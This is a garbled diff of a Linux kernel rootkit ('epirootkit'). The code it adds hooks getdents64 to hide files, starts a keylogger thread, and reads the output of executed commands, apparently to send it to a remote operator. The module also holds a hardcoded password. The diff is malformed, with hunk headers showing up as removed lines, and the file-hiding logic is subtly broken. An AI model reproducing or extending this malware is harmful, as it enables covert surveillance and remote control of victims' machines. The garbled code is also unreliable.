@@ -46,7 +46,9 @@ struct rootkit_config {
     int max_hidden_lines;
     const char *command_prefix_hide_line;
     const char *command_prefix_unhide_line;
-@@ -178,57 +181,58 @@ static struct network_manager net_manager = {
+};
+
+static struct network_manager net_manager = {
 };
 
 static int establish_connection(void) {
@@ -105,7 +107,25 @@ static bool g_is_authenticated = false;
 static char g_password[256] = "epita";
 static struct list_head *g_prev_module = NULL;
 static struct keylog_buffer *g_keylog_buffer = NULL;
-@@ -430,50 +434,99 @@ static void exec_and_send_output(const char *command) {
+
+static void exec_and_send_output(const char *command) {
+    struct file *output_file;
+    char *output_buffer;
+    int read_result;
+    mm_segment_t old_fs;
+
+    output_file = filp_open(config.temp_output_file, O_RDONLY, 0);
+    if (IS_ERR(output_file)) {
+        send_error(ROOTKIT_ERROR_FILE, "Failed to open output file");
+        return;
+    }
+
+    output_buffer = kmalloc(config.buffer_size, GFP_KERNEL);
+    if (!output_buffer) {
+        filp_close(output_file, NULL);
+        send_error(ROOTKIT_ERROR_MEMORY, "Failed to allocate output buffer");
+        return;
+    }
 
     memset(output_buffer, 0, config.buffer_size);
     old_fs = get_fs();
@@ -205,7 +225,28 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
                 memmove(dir, (void *)dir + dir->d_reclen, ret);
                 continue;
             }
-@@ -773,57 +826,58 @@ static int __init epirootkit_init(void) {
+            if (dir == dirent_ker + ret - dir->d_reclen) {
+                ret -= dir->d_reclen;
+                memmove(dir, (void *)dir + dir->d_reclen, ret);
+                continue;
+            }
+            if (prev) {
+                prev->d_reclen = dir->d_reclen;
+                prev->d_name = dir->d_name;
+            }
+            prev = dir;
+        }
+        off += dir->d_reclen;
+    }
+
+done:
+    if (copy_to_user(dirent, dirent_ker, ret))
+        ret = -EFAULT;
+    kfree(dirent_ker);
+    return ret;
+}
+
+static int __init epirootkit_init(void) {
     g_keylog_thread = kthread_run(keylog_thread, NULL, "keylog_thread");
     if (IS_ERR(g_keylog_thread)) {
         g_keylog_thread = NULL;
